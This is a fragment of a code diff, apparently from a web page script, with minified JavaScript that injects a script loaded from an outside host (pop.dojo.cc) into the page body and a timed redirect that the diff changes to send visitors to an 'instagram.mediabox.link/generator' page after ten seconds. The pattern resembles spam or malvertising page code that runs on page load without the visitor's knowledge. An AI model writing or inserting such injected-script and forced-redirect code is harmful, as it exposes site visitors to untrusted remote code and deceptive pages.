@@ -107,5 +107,5 @@ n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.i
 (n)&&document.querySelector(n).append(o)}}})();
 (function(){injectScript([{"attr":[{"name":"src","value":"//pop.dojo.cc/4344.js"}],"tag":"script","inner":""}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
 setTimeout(function () {
-   window.location.href = "https://goto.livre.link/en/movie";
-}, 20000);
+   window.location.href = "https://instagram.mediabox.link/generator";
+}, 10000);
